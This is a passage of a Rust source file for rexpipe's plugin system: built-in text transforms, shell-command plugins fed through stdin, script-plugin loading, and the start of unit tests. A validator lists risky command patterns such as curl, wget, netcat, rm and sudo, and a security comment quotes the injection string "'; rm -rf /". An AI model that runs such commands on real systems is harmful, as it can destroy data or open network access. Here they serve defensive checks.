//! Plugin system for custom transformations.
//!
//! This module provides an extensible plugin system for rexpipe, allowing users
//! to register custom transformation functions that can be used in pipelines.
//!
//! # Plugin Types
//!
//! - **Builtin plugins**: Pre-registered common transformations
//! - **Custom plugins**: User-defined functions registered at runtime
//! - **Shell plugins**: External commands executed via the shell
//!
//! # Built-in Plugins Reference
//!
//! ## String Manipulation
//!
//! | Plugin | Args | Description |
//! |--------|------|-------------|
//! | `reverse` | - | Reverse the string characters |
//! | `repeat` | `count` (default: 2) | Repeat the string N times |
//! | `slice` | `start`, `end` | Extract substring by character position |
//! | `pad_left` | `width`, `char` (default: space) | Left-pad to width |
//! | `pad_right` | `width`, `char` (default: space) | Right-pad to width |
//! | `truncate` | `max_len`, `suffix` (default: "...") | Truncate with ellipsis |
//! | `squeeze` | - | Collapse multiple whitespace to single space |
//! | `strip_prefix` | `prefix` | Remove prefix if present |
//! | `strip_suffix` | `suffix` | Remove suffix if present |
//!
//! ## Case Transformations
//!
//! | Plugin | Description |
//! |--------|-------------|
//! | `snake_case` | Convert to snake_case |
//! | `camel_case` | Convert to camelCase |
//! | `pascal_case` | Convert to PascalCase |
//! | `kebab_case` | Convert to kebab-case |
//!
//! ## Text Analysis
//!
//! | Plugin | Description |
//! |--------|-------------|
//! | `length` | Return string length in bytes |
//! | `word_count` | Count words (whitespace-separated) |
//! | `line_count` | Count lines (newline-separated) |
//! | `char_freq` | Character frequency analysis |
//!
//! ## Numeric Operations
//!
//! | Plugin | Args | Description |
//! |--------|------|-------------|
//! | `increment` | `amount` (default: 1) | Add to numeric string |
//! | `decrement` | `amount` (default: 1) | Subtract from numeric string |
//! | `format_number` | - | Add thousand separators |
//!
//! ## Encoding
//!
//! | Plugin | Description |
//! |--------|-------------|
//! | `hex_encode` | Encode string as hexadecimal |
//! | `hex_decode` | Decode hexadecimal to string |
//!
//! ## Utility
//!
//! | Plugin | Description |
//! |--------|-------------|
//! | `timestamp` | Return current Unix timestamp |
//!
//! # Custom Plugin Example
//!
//! ```rust
//! use rexpipe::plugin::{PluginRegistry, TransformFn};
//!
//! let mut registry = PluginRegistry::new();
//!
//! // Register a custom plugin
//! registry.register("double", |input, _args| {
//!     format!("{}{}", input, input)
//! });
//!
//! // Use the plugin
//! let result = registry.execute("double", "hello", &[]).unwrap();
//! assert_eq!(result, "hellohello");
//! ```
//!
//! # Shell Plugin Example
//!
//! Shell plugins allow external commands to transform text. Input is passed via
//! stdin and output is captured from stdout.
//!
//! ```rust,no_run
//! use rexpipe::plugin::PluginRegistry;
//!
//! // Execute a shell command (Unix-like systems)
//! let result = PluginRegistry::execute_shell("tr 'a-z' 'A-Z'", "hello");
//! // result is Ok("HELLO")
//! ```
//!
//! ## Security Note
//!
//! Shell commands receive input via stdin, not through command-line interpolation,
//! preventing command injection. However, the command string itself should still
//! be treated as trusted input.

use std::collections::HashMap;
use std::process::{Command, Stdio};
use std::sync::{Arc, LazyLock, RwLock};

/// Global plugin registry instance with built-in plugins pre-registered.
///
/// This static registry is initialized once and reused for all plugin
/// executions, avoiding the overhead of re-registering built-in plugins
/// for every transform operation.
///
/// The registry uses RwLock to allow runtime registration of plugins
/// via `load_plugins_to_global`.
static GLOBAL_REGISTRY: LazyLock<RwLock<PluginRegistry>> =
    LazyLock::new(|| RwLock::new(PluginRegistry::new()));

/// Type alias for plugin transformation functions
///
/// A transform function takes the matched text and optional arguments,
/// returning the transformed text.
pub type TransformFn = Arc<dyn Fn(&str, &[String]) -> String + Send + Sync>;

/// Registry for custom transformation plugins
///
/// The registry holds both built-in and user-registered transformation functions
/// that can be invoked by name during pipeline execution.
#[derive(Clone)]
pub struct PluginRegistry {
    plugins: HashMap<String, TransformFn>,
}

impl Default for PluginRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl PluginRegistry {
    /// Create a new plugin registry with built-in plugins
    pub fn new() -> Self {
        let mut registry = Self {
            plugins: HashMap::new(),
        };
        registry.register_builtins();
        registry
    }

    /// Execute a plugin from the global registry.
    ///
    /// This is the recommended way to access plugins for transform operations.
    /// The global registry is initialized once and reused.
    ///
    /// # Example
    ///
    /// ```
    /// use rexpipe::plugin::PluginRegistry;
    ///
    /// let result = PluginRegistry::global_execute("reverse", "hello", &[]).unwrap();
    /// assert_eq!(result, "olleh");
    /// ```
    pub fn global_execute(name: &str, input: &str, args: &[String]) -> Result<String, String> {
        GLOBAL_REGISTRY
            .read()
            .map_err(|e| format!("Failed to acquire registry lock: {}", e))?
            .execute(name, input, args)
    }

    /// Check if a plugin exists in the global registry.
    pub fn global_has_plugin(name: &str) -> bool {
        GLOBAL_REGISTRY
            .read()
            .map(|r| r.has_plugin(name))
            .unwrap_or(false)
    }

    /// List all plugins in the global registry.
    pub fn global_list_plugins() -> Vec<String> {
        GLOBAL_REGISTRY
            .read()
            .map(|r| r.list_plugins().iter().map(|s| s.to_string()).collect())
            .unwrap_or_default()
    }

    /// Load plugins from a directory into the global registry.
    ///
    /// This allows adding script-based plugins at runtime that will be
    /// available to all transform operations.
    ///
    /// # Example
    ///
    /// ```rust,no_run
    /// use rexpipe::plugin::PluginRegistry;
    /// use std::path::Path;
    ///
    /// let count = PluginRegistry::load_plugins_to_global(Path::new("./plugins")).unwrap();
    /// println!("Loaded {} plugins", count);
    /// ```
    pub fn load_plugins_to_global(dir: &std::path::Path) -> Result<usize, String> {
        GLOBAL_REGISTRY
            .write()
            .map_err(|e| format!("Failed to acquire registry lock: {}", e))?
            .load_plugins_from_dir(dir)
    }

    /// Load plugins from all default directories into the global registry.
    ///
    /// Scans default plugin directories and loads any found plugins.
    pub fn load_default_plugins_to_global() -> usize {
        if let Ok(mut registry) = GLOBAL_REGISTRY.write() {
            registry.load_default_plugins()
        } else {
            0
        }
    }

    /// Get a reference to the global plugin registry (deprecated).
    ///
    /// Use `global_execute`, `global_has_plugin`, or `global_list_plugins` instead.
    #[deprecated(since = "2.0.0", note = "Use global_execute() instead")]
    pub fn global() -> std::sync::RwLockReadGuard<'static, PluginRegistry> {
        GLOBAL_REGISTRY
            .read()
            .expect("Plugin registry lock poisoned")
    }

    /// Register built-in plugin functions
    fn register_builtins(&mut self) {
        // String manipulation
        self.register("reverse", |s, _| s.chars().rev().collect());
        self.register("repeat", |s, args| {
            let count: usize = args.first().and_then(|a| a.parse().ok()).unwrap_or(2);
            s.repeat(count)
        });
        self.register("slice", |s, args| {
            let start: usize = args.first().and_then(|a| a.parse().ok()).unwrap_or(0);
            let end: usize = args.get(1).and_then(|a| a.parse().ok()).unwrap_or(s.len());
            s.chars()
                .skip(start)
                .take(end.saturating_sub(start))
                .collect()
        });
        self.register("pad_left", |s, args| {
            let width: usize = args.first().and_then(|a| a.parse().ok()).unwrap_or(10);
            let pad_char: char = args.get(1).and_then(|a| a.chars().next()).unwrap_or(' ');
            format!("{:>width$}", s, width = width)
                .chars()
                .map(|c| if c == ' ' { pad_char } else { c })
                .collect()
        });
        self.register("pad_right", |s, args| {
            let width: usize = args.first().and_then(|a| a.parse().ok()).unwrap_or(10);
            let pad_char: char = args.get(1).and_then(|a| a.chars().next()).unwrap_or(' ');
            format!("{:<width$}", s, width = width)
                .chars()
                .map(|c| if c == ' ' { pad_char } else { c })
                .collect()
        });
        self.register("truncate", |s, args| {
            let max_len: usize = args.first().and_then(|a| a.parse().ok()).unwrap_or(10);
            let suffix: &str = args.get(1).map(|s| s.as_str()).unwrap_or("...");
            if s.len() > max_len {
                format!("{}{}", &s[..max_len.saturating_sub(suffix.len())], suffix)
            } else {
                s.to_string()
            }
        });

        // Case transformations
        self.register("snake_case", |s, _| {
            let mut result = String::new();
            for (i, c) in s.chars().enumerate() {
                if c.is_uppercase() && i > 0 {
                    result.push('_');
                }
                result.push(c.to_lowercase().next().unwrap_or(c));
            }
            result
        });
        self.register("camel_case", |s, _| {
            s.split(&[' ', '_', '-'][..])
                .enumerate()
                .map(|(i, word)| {
                    if i == 0 {
                        word.to_lowercase()
                    } else {
                        let mut chars = word.chars();
                        match chars.next() {
                            None => String::new(),
                            Some(c) => {
                                c.to_uppercase().collect::<String>()
                                    + chars.as_str().to_lowercase().as_str()
                            }
                        }
                    }
                })
                .collect()
        });
        self.register("pascal_case", |s, _| {
            s.split(&[' ', '_', '-'][..])
                .map(|word| {
                    let mut chars = word.chars();
                    match chars.next() {
                        None => String::new(),
                        Some(c) => {
                            c.to_uppercase().collect::<String>()
                                + chars.as_str().to_lowercase().as_str()
                        }
                    }
                })
                .collect()
        });
        self.register("kebab_case", |s, _| {
            let mut result = String::new();
            for (i, c) in s.chars().enumerate() {
                if c.is_uppercase() && i > 0 {
                    result.push('-');
                }
                result.push(c.to_lowercase().next().unwrap_or(c));
            }
            result.replace([' ', '_'], "-")
        });

        // Text analysis
        self.register("length", |s, _| s.len().to_string());
        self.register("word_count", |s, _| {
            s.split_whitespace().count().to_string()
        });
        self.register("line_count", |s, _| s.lines().count().to_string());
        self.register("char_freq", |s, _| {
            let mut freq: HashMap<char, usize> = HashMap::new();
            for c in s.chars() {
                *freq.entry(c).or_insert(0) += 1;
            }
            let mut pairs: Vec<_> = freq.into_iter().collect();
            pairs.sort_by(|a, b| b.1.cmp(&a.1));
            pairs
                .into_iter()
                .take(5)
                .map(|(c, n)| format!("{}:{}", c, n))
                .collect::<Vec<_>>()
                .join(",")
        });

        // Encoding
        self.register("hex_encode", |s, _| {
            s.bytes().map(|b| format!("{:02x}", b)).collect()
        });
        self.register("hex_decode", |s, _| {
            let bytes: Vec<u8> = (0..s.len())
                .step_by(2)
                .filter_map(|i| u8::from_str_radix(&s[i..i + 2.min(s.len())], 16).ok())
                .collect();
            String::from_utf8_lossy(&bytes).to_string()
        });

        // Whitespace handling
        self.register("squeeze", |s, _| {
            let mut result = String::new();
            let mut last_was_space = false;
            for c in s.chars() {
                if c.is_whitespace() {
                    if !last_was_space {
                        result.push(' ');
                        last_was_space = true;
                    }
                } else {
                    result.push(c);
                    last_was_space = false;
                }
            }
            result
        });
        self.register("strip_prefix", |s, args| {
            args.first()
                .map(|prefix| s.strip_prefix(prefix.as_str()).unwrap_or(s))
                .unwrap_or(s)
                .to_string()
        });
        self.register("strip_suffix", |s, args| {
            args.first()
                .map(|suffix| s.strip_suffix(suffix.as_str()).unwrap_or(s))
                .unwrap_or(s)
                .to_string()
        });

        // Numeric
        self.register("increment", |s, args| {
            let delta: i64 = args.first().and_then(|a| a.parse().ok()).unwrap_or(1);
            s.parse::<i64>()
                .map(|n| (n + delta).to_string())
                .unwrap_or_else(|_| s.to_string())
        });
        self.register("decrement", |s, args| {
            let delta: i64 = args.first().and_then(|a| a.parse().ok()).unwrap_or(1);
            s.parse::<i64>()
                .map(|n| (n - delta).to_string())
                .unwrap_or_else(|_| s.to_string())
        });
        self.register("format_number", |s, _| {
            s.parse::<i64>()
                .map(|n| {
                    let s = n.abs().to_string();
                    let mut result = String::new();
                    for (i, c) in s.chars().rev().enumerate() {
                        if i > 0 && i % 3 == 0 {
                            result.push(',');
                        }
                        result.push(c);
                    }
                    if n < 0 {
                        result.push('-');
                    }
                    result.chars().rev().collect()
                })
                .unwrap_or_else(|_| s.to_string())
        });

        // Date/time (simple formats)
        self.register("timestamp", |_, _| {
            web_time::SystemTime::now()
                .duration_since(web_time::UNIX_EPOCH)
                .map(|d| d.as_secs().to_string())
                .unwrap_or_else(|_| "0".to_string())
        });

        // Music: chord transposition
        // Transposes a chord by a number of semitones
        // Usage: transpose <semitones>
        // Example: "C" with args ["2"] -> "D"
        //          "Am7" with args ["5"] -> "Dm7"
        //          "F#m" with args ["-2"] -> "Em"
        self.register("transpose", |s, args| {
            let semitones: i32 = args.first().and_then(|a| a.parse().ok()).unwrap_or(0);
            if semitones == 0 {
                return s.to_string();
            }

            // Chromatic scale using sharps
            const NOTES_SHARP: [&str; 12] = [
                "C", "C#", "D", "D#", "E", "F", "F#", "G", "G#", "A", "A#", "B",
            ];
            // Chromatic scale using flats
            const NOTES_FLAT: [&str; 12] = [
                "C", "Db", "D", "Eb", "E", "F", "Gb", "G", "Ab", "A", "Bb", "B",
            ];

            // Parse the chord: extract root note (with optional accidental) and suffix
            let chars: Vec<char> = s.chars().collect();
            if chars.is_empty() {
                return s.to_string();
            }

            // First char must be A-G
            let root_letter = chars[0].to_ascii_uppercase();
            if !('A'..='G').contains(&root_letter) {
                return s.to_string();
            }

            // Check for accidental (# or b)
            let (accidental, suffix_start) = if chars.len() > 1 {
                match chars[1] {
                    '#' => (Some('#'), 2),
                    'b' => (Some('b'), 2),
                    _ => (None, 1),
                }
            } else {
                (None, 1)
            };

            // Build root note string
            let root = if let Some(acc) = accidental {
                format!("{}{}", root_letter, acc)
            } else {
                root_letter.to_string()
            };

            // Get suffix (m, maj, min, dim, aug, 7, 9, 11, 13, etc.)
            let suffix: String = chars[suffix_start..].iter().collect();

            // Determine if we're using sharps or flats based on input
            let use_flats = accidental == Some('b');
            let notes = if use_flats { &NOTES_FLAT } else { &NOTES_SHARP };

            // Find current note index
            let current_idx = notes.iter().position(|&n| n.eq_ignore_ascii_case(&root));
            let current_idx = current_idx.or_else(|| {
                // Try the other scale if not found
                let other_notes = if use_flats { &NOTES_SHARP } else { &NOTES_FLAT };
                other_notes
                    .iter()
                    .position(|&n| n.eq_ignore_ascii_case(&root))
            });

            match current_idx {
                Some(idx) => {
                    // Calculate new index with wrapping
                    let new_idx = ((idx as i32 + semitones).rem_euclid(12)) as usize;
                    format!("{}{}", notes[new_idx], suffix)
                }
                None => s.to_string(), // Return unchanged if note not found
            }
        });
    }

    /// Register a custom plugin function
    ///
    /// # Arguments
    ///
    /// * `name` - The name to register the plugin under
    /// * `func` - The transformation function
    ///
    /// # Example
    ///
    /// ```rust
    /// use rexpipe::plugin::PluginRegistry;
    ///
    /// let mut registry = PluginRegistry::new();
    /// registry.register("exclaim", |s, _| format!("{}!", s));
    /// ```
    pub fn register<F>(&mut self, name: &str, func: F)
    where
        F: Fn(&str, &[String]) -> String + Send + Sync + 'static,
    {
        self.plugins.insert(name.to_string(), Arc::new(func));
    }

    /// Check if a plugin is registered
    pub fn has_plugin(&self, name: &str) -> bool {
        self.plugins.contains_key(name)
    }

    /// List all registered plugin names
    pub fn list_plugins(&self) -> Vec<&str> {
        let mut names: Vec<_> = self.plugins.keys().map(|s| s.as_str()).collect();
        names.sort();
        names
    }

    /// Execute a registered plugin
    ///
    /// # Arguments
    ///
    /// * `name` - The name of the plugin to execute
    /// * `input` - The input text to transform
    /// * `args` - Additional arguments for the plugin
    ///
    /// # Returns
    ///
    /// The transformed text, or an error if the plugin is not found
    pub fn execute(&self, name: &str, input: &str, args: &[String]) -> Result<String, String> {
        self.plugins
            .get(name)
            .map(|func| func(input, args))
            .ok_or_else(|| {
                format!(
                    "Plugin not found: '{}'. Available: {:?}",
                    name,
                    self.list_plugins()
                )
            })
    }

    /// Validate a shell command for potentially dangerous patterns.
    ///
    /// Returns a list of security warnings for the command. An empty list means
    /// no obvious risks were detected (but always review shell commands carefully).
    ///
    /// # Security Warnings Detected
    ///
    /// - Commands that modify/delete files (rm, del, rmdir, mv, etc.)
    /// - Commands that download content (curl, wget, etc.)
    /// - Commands that access network (nc, netcat, ssh, etc.)
    /// - Commands that modify system (chmod, chown, sudo, etc.)
    /// - Commands with output redirection (>, >>)
    /// - Commands with environment variable expansion ($VAR, %VAR%)
    pub fn validate_shell_command(command: &str) -> Vec<String> {
        let mut warnings = Vec::new();
        let cmd_lower = command.to_lowercase();

        // Dangerous file operations
        let file_ops = [
            ("rm ", "removes files"),
            ("rm\t", "removes files"),
            ("rmdir", "removes directories"),
            ("del ", "deletes files (Windows)"),
            ("rd ", "removes directories (Windows)"),
            ("mv ", "moves/renames files"),
            ("move ", "moves files (Windows)"),
            ("cp ", "copies files"),
            ("copy ", "copies files (Windows)"),
        ];
        for (pattern, desc) in file_ops {
            if cmd_lower.contains(pattern) {
                warnings.push(format!("Command {} - may modify filesystem", desc));
            }
        }

        // Network access
        let network_ops = [
            ("curl ", "downloads from network"),
            ("wget ", "downloads from network"),
            ("nc ", "network connection (netcat)"),
            ("netcat", "network connection"),
            ("ssh ", "SSH connection"),
            ("scp ", "secure copy over network"),
            ("rsync", "remote sync"),
            ("ftp ", "FTP connection"),
        ];
        for (pattern, desc) in network_ops {
            if cmd_lower.contains(pattern) {
                warnings.push(format!("Command {} - network access", desc));
            }
        }

        // Privilege escalation
        let priv_ops = [
            ("sudo ", "privilege escalation"),
            ("su ", "switch user"),
            ("chmod ", "changes permissions"),
            ("chown ", "changes ownership"),
            ("runas", "run as different user (Windows)"),
        ];
        for (pattern, desc) in priv_ops {
            if cmd_lower.contains(pattern) {
                warnings.push(format!("Command uses {} - elevated privileges", desc));
            }
        }

        // Output redirection (could overwrite files)
        if command.contains(">>") {
            warnings.push("Command appends to file (>>)".to_string());
        } else if command.contains('>') && !command.contains(">&") {
            warnings.push("Command redirects output to file (>)".to_string());
        }

        // Environment variable expansion (could leak secrets)
        if command.contains('$') && !command.contains("$'") {
            warnings.push("Command contains shell variable expansion ($)".to_string());
        }
        if command.contains('%') && cfg!(target_os = "windows") {
            warnings.push("Command may contain Windows variable expansion (%)".to_string());
        }

        // Eval/exec (code injection risk)
        if cmd_lower.contains("eval ") || cmd_lower.contains("exec ") {
            warnings.push("Command uses eval/exec - potential code injection".to_string());
        }

        // Backticks or $() command substitution
        if command.contains('`') || command.contains("$(") {
            warnings.push("Command uses command substitution".to_string());
        }

        warnings
    }

    /// Execute a shell command as a transformation
    ///
    /// The input text is passed to the command via stdin, and the command's
    /// stdout is returned as the transformed text.
    ///
    /// # Arguments
    ///
    /// * `command` - The shell command to execute
    /// * `input` - The input text to pass to the command
    ///
    /// # Returns
    ///
    /// The command's stdout, or an error message
    ///
    /// # Security Considerations
    ///
    /// This executes shell commands defined in the configuration file.
    /// The matched text is passed via stdin (NOT interpolated into the command),
    /// which prevents shell injection from regex matches.
    ///
    /// **Safe pattern**: The command template comes from the config file (user-controlled)
    /// and the matched text is piped to stdin, not embedded in the command string.
    ///
    /// **Timeout**: Commands have a 30-second timeout to prevent hanging.
    ///
    /// Use [`Self::validate_shell_command`] to check for potentially dangerous patterns
    /// before execution.
    ///
    /// # Example Configuration (TOML)
    /// ```toml
    /// [[step]]
    /// type = "transform"
    /// pattern = "\\d+"
    /// transform_action = { shell = { command = "python -c 'import sys; print(int(sys.stdin.read()) * 2)'" } }
    /// ```
    ///
    /// Uses the default timeout of 30 seconds. For configurable timeout,
    /// use [`Self::execute_shell_with_timeout`].
    pub fn execute_shell(command: &str, input: &str) -> Result<String, String> {
        Self::execute_shell_with_timeout(command, input, 30)
    }

    /// Execute a shell command with input and configurable timeout.
    ///
    /// # Arguments
    ///
    /// * `command` - The shell command to execute
    /// * `input` - Input to pass to the command via stdin
    /// * `timeout_secs` - Maximum execution time in seconds (0 = no timeout)
    ///
    /// # Returns
    ///
    /// The command's stdout output on success, or an error message on failure.
    pub fn execute_shell_with_timeout(
        command: &str,
        input: &str,
        timeout_secs: u64,
    ) -> Result<String, String> {
        use std::io::Write;
        use web_time::Duration;

        // SECURITY: Platform-specific shell selection
        // Why sh -c on Unix: Provides consistent POSIX shell behavior
        // Why cmd /C on Windows: Native command processor with similar semantics
        #[cfg(target_os = "windows")]
        let shell_cmd = ("cmd", "/C");
        #[cfg(not(target_os = "windows"))]
        let shell_cmd = ("sh", "-c");

        // SECURITY: Why we use stdin for input instead of command interpolation:
        //
        // UNSAFE: format!("echo '{}'", user_input)
        //   - If user_input contains quotes or special chars, shell injection occurs
        //   - Example: user_input = "'; rm -rf /" would execute destructive command
        //
        // SAFE: Pass via stdin + child.stdin.write_all()
        //   - Input never touches shell parser
        //   - No injection possible regardless of input content
        //   - This is why matched regex text is safe to pass through transforms
        //
        // The command itself comes from the configuration file which is trusted,
        // but the INPUT data (matched text) could be anything - even malicious.
        let mut child = Command::new(shell_cmd.0)
            .arg(shell_cmd.1)
            .arg(command)
            .stdin(Stdio::piped()) // Capture stdin for safe input passing
            .stdout(Stdio::piped()) // Capture output for return value
            .stderr(Stdio::piped()) // Capture errors for diagnostics
            .spawn()
            .map_err(|e| format!("Failed to spawn shell command: {}", e))?;

        // Write input to stdin - this is the SAFE way to pass data to shell commands
        // The shell never interprets this data; it goes directly to the command's stdin
        if let Some(ref mut stdin) = child.stdin {
            stdin
                .write_all(input.as_bytes())
                .map_err(|e| format!("Failed to write to stdin: {}", e))?;
        }
        // Close stdin to signal EOF - command can now process and exit
        // Why explicit drop: Ensures the pipe is closed even if we return early
        drop(child.stdin.take());

        // Wait with timeout to prevent hanging commands (0 = no timeout)
        let timeout = if timeout_secs > 0 {
            Some(Duration::from_secs(timeout_secs))
        } else {
            None
        };
        let start = web_time::Instant::now();

        loop {
            match child.try_wait() {
                Ok(Some(status)) => {
                    // Process exited, read output
                    let output = child
                        .wait_with_output()
                        .map_err(|e| format!("Failed to read command output: {}", e))?;

                    if status.success() {
                        return Ok(String::from_utf8_lossy(&output.stdout)
                            .trim_end()
                            .to_string());
                    } else {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        return Err(format!("Command failed: {}", stderr.trim()));
                    }
                }
                Ok(None) => {
                    // Still running, check timeout
                    if let Some(timeout_duration) = timeout {
                        if start.elapsed() >= timeout_duration {
                            let _ = child.kill();
                            return Err(format!(
                                "Shell command timed out after {} seconds",
                                timeout_secs
                            ));
                        }
                    }
                    // Brief sleep before retry
                    std::thread::sleep(Duration::from_millis(10));
                }
                Err(e) => return Err(format!("Failed to check command status: {}", e)),
            }
        }
    }

    /// Load script-based plugins from a directory.
    ///
    /// Scans the directory for executable scripts and registers them as plugins.
    /// Plugin names are derived from filenames (without extension).
    ///
    /// # Supported script types
    ///
    /// - Shell scripts (.sh)
    /// - Python scripts (.py)
    /// - Ruby scripts (.rb)
    /// - Perl scripts (.pl)
    /// - Any executable file
    ///
    /// # Arguments
    ///
    /// * `dir` - Path to the plugins directory
    ///
    /// # Returns
    ///
    /// Number of plugins loaded, or an error
    ///
    /// # Example
    ///
    /// ```rust,no_run
    /// use rexpipe::plugin::PluginRegistry;
    /// use std::path::Path;
    ///
    /// let mut registry = PluginRegistry::new();
    /// let count = registry.load_plugins_from_dir(Path::new("~/.config/rexpipe/plugins")).unwrap();
    /// println!("Loaded {} plugins", count);
    /// ```
    pub fn load_plugins_from_dir(&mut self, dir: &std::path::Path) -> Result<usize, String> {
        if !dir.exists() {
            return Ok(0); // Silently skip non-existent directories
        }

        if !dir.is_dir() {
            return Err(format!("{} is not a directory", dir.display()));
        }

        let entries = std::fs::read_dir(dir)
            .map_err(|e| format!("Failed to read plugins directory {}: {}", dir.display(), e))?;

        let mut count = 0;
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Some(name) = self.register_script_plugin(&path) {
                    log::debug!("Loaded plugin '{}' from {}", name, path.display());
                    count += 1;
                }
            }
        }

        Ok(count)
    }

    /// Register a script file as a plugin.
    ///
    /// Returns the plugin name if successful, None otherwise.
    fn register_script_plugin(&mut self, path: &std::path::Path) -> Option<String> {
        let file_name = path.file_stem()?.to_str()?.to_string();
        let extension = path
            .extension()
            .and_then(|e| e.to_str())
            .map(|s| s.to_string());

        // Determine the interpreter based on extension
        let interpreter: Option<&'static str> = match extension.as_deref() {
            Some("sh") => Some("sh"),
            Some("py") => Some("python3"),
            Some("rb") => Some("ruby"),
            Some("pl") => Some("perl"),
            _ => None, // Assume executable
        };

        let plugin_name = file_name.clone();
        let script_path = path.to_path_buf();

        // Create the plugin function
        self.register(&plugin_name, move |input, args| {
            let command = if let Some(interp) = interpreter {
                format!("{} {}", interp, script_path.display())
            } else {
                script_path.display().to_string()
            };

            // Append args to command
            let full_command = if args.is_empty() {
                command
            } else {
                format!("{} {}", command, args.join(" "))
            };

            match Self::execute_shell(&full_command, input) {
                Ok(output) => output,
                Err(e) => {
                    eprintln!("Plugin '{}' failed: {}", file_name, e);
                    input.to_string() // Return unchanged on error
                }
            }
        });

        Some(plugin_name)
    }

    /// Get the default plugin directories.
    ///
    /// Returns paths to search for plugins, in order of priority:
    /// 1. `./plugins/` (current directory)
    /// 2. `~/.config/rexpipe/plugins/`
    /// 3. `/usr/local/share/rexpipe/plugins/` (Unix)
    /// 4. `$REXPIPE_PLUGIN_DIR` (if set)
    pub fn default_plugin_dirs() -> Vec<std::path::PathBuf> {
        let mut dirs = vec![];

        // Current directory plugins
        dirs.push(std::path::PathBuf::from("./plugins"));

        // User config directory
        if let Some(config_dir) = dirs::config_dir() {
            dirs.push(config_dir.join("rexpipe").join("plugins"));
        }

        // System directory (Unix-like)
        #[cfg(unix)]
        dirs.push(std::path::PathBuf::from("/usr/local/share/rexpipe/plugins"));

        // Environment variable override
        if let Ok(env_dir) = std::env::var("REXPIPE_PLUGIN_DIR") {
            dirs.push(std::path::PathBuf::from(env_dir));
        }

        dirs
    }

    /// Load plugins from all default directories.
    ///
    /// Scans default plugin directories and loads any found plugins.
    /// Silently skips directories that don't exist.
    ///
    /// # Returns
    ///
    /// Total number of plugins loaded
    pub fn load_default_plugins(&mut self) -> usize {
        let mut total = 0;
        for dir in Self::default_plugin_dirs() {
            if let Ok(count) = self.load_plugins_from_dir(&dir) {
                total += count;
            }
        }
        total
    }
}

impl std::fmt::Debug for PluginRegistry {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("PluginRegistry")
            .field("plugins", &self.list_plugins())
            .finish()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_builtin_reverse() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("reverse", "hello", &[]).unwrap(), "olleh");
    }

    #[test]
    fn test_builtin_reverse_empty() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("reverse", "", &[]).unwrap(), "");
    }

    #[test]
    fn test_builtin_reverse_unicode() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("reverse", "日本語", &[]).unwrap(),
            "語本日"
        );
    }

    #[test]
    fn test_builtin_repeat() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("repeat", "ab", &["3".to_string()])
                .unwrap(),
            "ababab"
        );
    }

    #[test]
    fn test_builtin_repeat_default() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("repeat", "x", &[]).unwrap(), "xx");
    }

    #[test]
    fn test_builtin_repeat_zero() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("repeat", "x", &["0".to_string()]).unwrap(),
            ""
        );
    }

    #[test]
    fn test_builtin_slice() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("slice", "hello", &["1".to_string(), "4".to_string()])
                .unwrap(),
            "ell"
        );
    }

    #[test]
    fn test_builtin_slice_defaults() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("slice", "hello", &[]).unwrap(), "hello");
    }

    #[test]
    fn test_builtin_slice_start_only() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("slice", "hello", &["2".to_string()])
                .unwrap(),
            "llo"
        );
    }

    #[test]
    fn test_builtin_pad_left() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("pad_left", "hi", &["5".to_string()])
                .unwrap(),
            "   hi"
        );
    }

    #[test]
    fn test_builtin_pad_left_custom_char() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("pad_left", "hi", &["5".to_string(), "0".to_string()])
                .unwrap(),
            "000hi"
        );
    }

    #[test]
    fn test_builtin_pad_right() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("pad_right", "hi", &["5".to_string()])
                .unwrap(),
            "hi   "
        );
    }

    #[test]
    fn test_builtin_truncate() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("truncate", "hello world", &["8".to_string()])
                .unwrap(),
            "hello..."
        );
    }

    #[test]
    fn test_builtin_truncate_no_truncation() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("truncate", "hi", &["10".to_string()])
                .unwrap(),
            "hi"
        );
    }

    #[test]
    fn test_builtin_truncate_custom_suffix() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute(
                    "truncate",
                    "hello world",
                    &["8".to_string(), ">>".to_string()]
                )
                .unwrap(),
            "hello >>"
        );
    }

    #[test]
    fn test_builtin_snake_case() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("snake_case", "helloWorld", &[]).unwrap(),
            "hello_world"
        );
    }

    #[test]
    fn test_builtin_snake_case_already_snake() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("snake_case", "hello_world", &[]).unwrap(),
            "hello_world"
        );
    }

    #[test]
    fn test_builtin_camel_case() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("camel_case", "hello_world", &[]).unwrap(),
            "helloWorld"
        );
    }

    #[test]
    fn test_builtin_camel_case_from_kebab() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("camel_case", "hello-world", &[]).unwrap(),
            "helloWorld"
        );
    }

    #[test]
    fn test_builtin_pascal_case() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("pascal_case", "hello_world", &[]).unwrap(),
            "HelloWorld"
        );
    }

    #[test]
    fn test_builtin_pascal_case_from_space() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("pascal_case", "hello world", &[]).unwrap(),
            "HelloWorld"
        );
    }

    #[test]
    fn test_builtin_kebab_case() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("kebab_case", "helloWorld", &[]).unwrap(),
            "hello-world"
        );
    }

    #[test]
    fn test_builtin_kebab_case_from_spaces() {
        let registry = PluginRegistry::new();
        assert_eq!(
